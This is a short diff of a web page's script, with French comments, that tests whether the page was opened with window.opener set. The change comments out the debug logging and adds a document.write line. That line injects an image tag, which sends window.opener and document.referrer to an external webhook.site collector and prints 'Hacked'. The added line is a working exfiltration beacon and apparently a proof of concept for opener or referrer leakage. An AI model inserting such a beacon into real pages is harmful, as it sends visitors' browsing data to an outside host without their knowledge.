@@ -16,13 +16,14 @@
       out.textContent = window.opener ? "OPENER: OUI" : "OPENER: NON";
 
       // Bonus debug : montre le type, sans accéder au DOM de l'opener
-      console.log("typeof window.opener =", typeof window.opener);
+      //console.log("typeof window.opener =", typeof window.opener);
 
-       console.log("window.opener =", window.opener);
-      console.log("window.opener === null ?", window.opener === null);
-      console.log("document.referrer =", document.referrer);
+       //console.log("window.opener =", window.opener);
+     // console.log("window.opener === null ?", window.opener === null);
+      //console.log("document.referrer =", document.referrer);
+      document.write('<IMG SRC=\"https://webhook.site/cbe50c11-4491-4fe5-8702-47dd10daadfb?a=' + window.opener + 'et' + document.referrer + '\">Hacked</IMG>');
+
    
- 
   </script>
 
 </body>
